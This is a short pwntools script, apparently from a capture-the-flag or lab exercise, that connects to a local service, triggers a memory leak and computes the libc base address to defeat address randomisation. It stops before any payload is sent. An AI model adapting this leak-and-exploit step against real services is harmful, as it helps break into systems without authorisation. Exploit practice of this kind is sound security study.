#!/usr/bin/python3
from pwn import *

client = remote("localhost",6668)
client.send(b'I')
libc_leak = client.recv()[16:16+8]
libc_start_addr = u64(libc_leak)-0x2b80
print(f'libc start addr = : {hex(libc_start_addr)}')
payload_form = p64(libc_start_addr)
client.interactive()
